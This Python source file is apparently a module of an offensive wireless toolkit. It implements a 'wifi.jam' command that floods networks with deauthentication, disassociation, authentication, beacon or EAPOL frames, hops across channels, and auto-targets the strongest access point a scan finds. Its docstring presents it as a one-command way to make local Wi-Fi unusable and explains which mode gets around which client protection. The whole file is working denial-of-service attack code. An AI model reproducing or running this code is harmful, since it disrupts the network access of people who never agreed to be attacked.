"""Wi-Fi jamming as a command: choose a mode, build a plan, fire it.

``wifi.deauth_rage`` kicks clients off one AP adaptively and stops there. This
is the blunt end of the same idea: five flood types, band hopping, and target
selection, so "make the Wi-Fi here unusable" is one command. The plans and the
exact command lines live in :mod:`omni.wifi.jam`.

Which mode, when:

* ``deauth`` — a specific client must lose the AP (least collateral);
* ``disassoc`` — the client filters reason 7 but honours a disassociation;
* ``auth`` — the AP's association table must fill up;
* ``beacon`` — the scan list must become unusable (venue-wide annoyance);
* ``eapol`` — WPA3/PMF clients, which ignore forged deauth entirely.
"""

from __future__ import annotations

from omni.core import console
from omni.core.module import Option
from omni.wifi import jam, scan
from omni.wifi.modules._base import WifiModule

__all__ = ["Jam", "pick_target"]


def pick_target(aps: list[dict], bssid: str = "") -> dict | None:
    """The AP to attack: the named one, else the strongest signal heard."""
    wanted = (bssid or "").strip().upper()
    if wanted:
        for ap in aps:
            if str(ap.get("bssid", "")).upper() == wanted:
                return ap
        return None
    real = [ap for ap in aps if ap.get("bssid")]
    if not real:
        return None

    def signal(ap: dict) -> float:
        value = ap.get("signal")
        return float(value) if value is not None else -999.0

    return sorted(real, key=signal, reverse=True)[0]


class Jam(WifiModule):
    NAME = "wifi.jam"
    DESCRIPTION = "Jam Wi-Fi: deauth/disassoc/auth/beacon/EAPOL with hopping"
    NEEDS = ("iw",)
    OPTIONS = (Option("MODE", "deauth|disassoc|auth|beacon|eapol", "deauth",
                       choices=("deauth", "disassoc", "auth", "beacon",
                                "eapol")),
               Option("BSSID", "target AP MAC (blank + SCAN finds one)"),
               Option("CLIENTS", "one client MAC to target (deauth/disassoc)"),
               Option("SSIDS", "beacon SSIDs, comma separated"),
               Option("LIST", "existing SSID list file for mdk4"),
               Option("CHANNELS", "e.g. 1-11,36,44 (blank = whole band)"),
               Option("BAND", "2.4|5 — used when CHANNELS is blank", "2.4",
                      choices=("2.4", "5")),
               Option("SECONDS", "how long to jam", "30"),
               Option("DWELL_MS", "time per channel slot", "500"),
               Option("PPS", "frames per second per slot", "1000"),
               Option("REASON", "802.11 reason code", "7"),
               Option("SCAN", "seconds to scan when BSSID is blank", "0"),
               Option("TOOL", "auto|mdk4|aireplay", "auto",
                      choices=("auto", "mdk4", "aireplay")),
               Option("IFACE", "wireless interface"))

    def _target(self, mon: str, mode: str) -> tuple[str, int]:
        """``(bssid, channel)`` for a targeted mode, scanning when needed."""
        bssid = self.get("BSSID").strip().upper()
        if mode not in jam.TARGETED or bssid:
            return bssid, 0
        seconds = max(0, self.get_int("SCAN", 0))
        if not seconds:
            raise ValueError("give BSSID, or SCAN=15 to pick the strongest "
                             "AP automatically")
        console.info(f"scanning for {seconds}s to pick a target")
        best = pick_target(scan.scan_airodump(mon, seconds))
        if best is None:
            raise RuntimeError("no AP answered the scan — pass BSSID")
        channel = int(best.get("channel") or 0)
        console.ok(f"target {best['bssid']} ({best.get('ssid') or '?'}) "
                   f"ch {channel or '?'} {best.get('security') or ''}".strip())
        return str(best["bssid"]).upper(), channel

    def execute(self) -> dict:
        mode = self.get("MODE")
        seconds = max(1, self.get_int("SECONDS", 30))
        dwell = max(100, self.get_int("DWELL_MS", 500))
        mon = self.monitor()
        try:
            bssid, ap_channel = self._target(mon, mode)
            spec = self.get("CHANNELS").strip()
            if spec:
                channel_list = jam.channels(spec, self.get("BAND"))
            elif mode in jam.TARGETED and ap_channel:
                channel_list = [ap_channel]
            else:
                channel_list = jam.channels("", self.get("BAND"))
            plan = jam.hop_plan(channel_list, seconds, dwell)

            ssid_path = ""
            ssid = self.get("SSIDS").split(",")[0].strip()
            if mode == "beacon":
                ssid_path = self.get("LIST").strip() or jam.ssid_file(
                    jam.ssid_list(self.get("SSIDS")))
                console.info(f"SSID list: {ssid_path}")
            elif mode == "eapol" and not ssid:
                ssid = bssid

            console.kv([("mode", mode),
                        ("target", bssid or "(flood)"),
                        ("channels", ", ".join(str(c)
                                               for c in channel_list[:16])),
                        ("window", f"{seconds}s"),
                        ("slots", str(len(plan)))])
            jammer = jam.Jammer(
                mon, mode, plan, bssid=bssid, ssid=ssid,
                ssid_path=ssid_path,
                client=self.get("CLIENTS").split(",")[0].strip(),
                pps=max(1, self.get_int("PPS", 1000)),
                reason=self.get_int("REASON", 7),
                tool="" if self.get("TOOL") == "auto" else self.get("TOOL"))
            report = jammer.run()
            report.update({"bssid": bssid, "channels": channel_list,
                           "ssid_file": ssid_path})
            return report
        finally:
            self.restore(mon)
